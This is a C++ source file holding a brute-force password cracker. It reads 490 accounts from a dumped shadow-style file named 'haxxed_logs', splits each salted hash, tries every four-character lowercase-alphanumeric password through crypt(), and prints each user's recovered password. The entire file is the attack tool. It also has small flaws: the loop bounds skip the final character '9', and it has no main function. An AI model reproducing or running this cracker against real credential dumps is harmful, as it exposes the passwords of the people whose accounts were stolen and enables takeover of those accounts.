#include <iostream>
#include <fstream>
#include <unistd.h>
 
using namespace std;
 
void bruteforce()
{
	const char alphabet[36] =
	{
		'a', 'b', 'c', 'd', 'e', 'f', 'g',
		'h', 'i', 'j', 'k', 'l', 'm', 'n',
		'o', 'p', 'q', 'r', 's', 't', 'u',
		'v', 'w', 'x', 'y', 'z',
		'0', '1', '2', '3', '4', '5', '6',
		'7', '8', '9'
	};
	
    ifstream shadow_file("haxxed_logs", ios::in);
 
    string rest;
    string encrypted;
	
	string users[490];
	string salts[490];
	string passwords[490];
	string rest_infos[490];
	string hash;
	
	char generated_password[5];
	string encrypted_password;
	
	bool flag;
   
 
    if(shadow_file.is_open())
	{		
		for(int i=0;i<490;i++)				//reading each account from file...
		{
			getline(shadow_file, users[i], ':');	//get username...
			getline(shadow_file, hash, ':');		//get hash (salt+password)...
			getline(shadow_file, rest_infos[i]);	//get additional info...

			salts[i]=hash.substr(0,12);				//split salt and password		
			passwords[i]=hash.substr(12,26);
		}
		
		
		cout<<"*******************************"<<endl;
		cout<<"Brute Force Attack Initiated..."<<endl;
		cout<<"*******************************"<<endl;

		for(int m=0;m<490;m++)
		{
			cout<<"Scanning for "<<users[m]<<"..."<<endl;
			flag=false;
		
			for(int i=0;i<35;i++)				//for
			{
				for(int j=0;j<35;j++)				//every
				{
					for(int k=0;k<35;k++)				//4-character
					{
						for(int l=0;l<35;l++)				//combination...
						{
							generated_password[0]=alphabet[i];	//generate a password...
							generated_password[1]=alphabet[j];
							generated_password[2]=alphabet[k];
							generated_password[3]=alphabet[l];
							generated_password[4]='\0';
									
							encrypted=crypt(generated_password, salts[m].c_str());	//encrypt the generated password with each user's salt
							encrypted_password=encrypted.substr(12,26);

							if(encrypted_password.compare(passwords[m])==0) 		//check if the password hash is identical to the generated
							{
								cout<<"\t"<<users[m]<<"'s password is... "<<generated_password<<endl;	
								flag=true;
							}
						}
						
						if(flag)
							break;
					}
					
					if(flag)
						break;
				}
				
				if (flag)
					break;
			}
		}
		
        shadow_file.close();
		
		cout<<"*******************************"<<endl;
    }
    else
    {
        cout<<"Error opening account's database"<<endl;
    }
}
